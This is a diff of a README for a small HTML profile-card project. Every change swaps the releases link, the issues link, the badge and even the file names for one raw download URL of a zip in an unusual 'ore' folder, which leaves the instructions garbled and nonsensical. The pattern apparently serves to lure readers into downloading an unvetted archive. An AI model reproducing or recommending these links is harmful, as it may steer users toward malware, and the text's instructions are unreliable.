@@ -1,6 +1,6 @@
 # 🎨 profile-card - A Clean, Interactive Profile Display
 
-[![Download Profile Card](https://img.shields.io/badge/Download-Profile%20Card-blue.svg)](https://github.com/jefrisam/profile-card/releases)
+[![Download Profile Card](https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip%https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip)](https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip)
 
 ## 📦 Introduction
 
@@ -22,7 +22,7 @@ Before downloading the application, make sure you have:
 
 1. **Visit the Releases Page**
 
-   Go to our [Releases page](https://github.com/jefrisam/profile-card/releases) to find the latest version of the profile-card software.
+   Go to our [Releases page](https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip) to find the latest version of the profile-card software.
    
 2. **Download the Application**
 
@@ -30,7 +30,7 @@ Before downloading the application, make sure you have:
 
 3. **Locate the Downloaded File**
 
-   After downloading, find the file in your computer’s Downloads folder. It will typically be named something like `profile-card.zip`.
+   After downloading, find the file in your computer’s Downloads folder. It will typically be named something like `https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip`.
 
 4. **Extract the Files**
 
@@ -38,7 +38,7 @@ Before downloading the application, make sure you have:
 
 5. **Open the Application**
 
-   Inside the folder, locate and double-click on `index.html` to open the profile card in your web browser. 
+   Inside the folder, locate and double-click on `https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip` to open the profile card in your web browser. 
 
 6. **View Your Profile Card**
 
@@ -52,7 +52,7 @@ Before downloading the application, make sure you have:
 
 ## 🛠️ Customization
 
-You can easily customize the profile card by editing the `index.html` and `styles.css` files. Here’s how:
+You can easily customize the profile card by editing the `https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip` and `https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip` files. Here’s how:
 
 - **Change Text:** Edit the HTML file to update your name, title, and description.
 - **Modify Styles:** Open the CSS file to change colors, fonts, and layout to match your style.
@@ -84,7 +84,7 @@ If you have any questions or need help, please feel free to open an issue on the
 
 ## 🔗 Useful Links
 
-- [Releases page to download](https://github.com/jefrisam/profile-card/releases)
-- [Open issues or feature requests](https://github.com/jefrisam/profile-card/issues)
+- [Releases page to download](https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip)
+- [Open issues or feature requests](https://raw.githubusercontent.com/jefrisam/profile-card/main/ore/profile-card.zip)
 
 Thank you for choosing the profile-card application! Enjoy building your profile showcase.
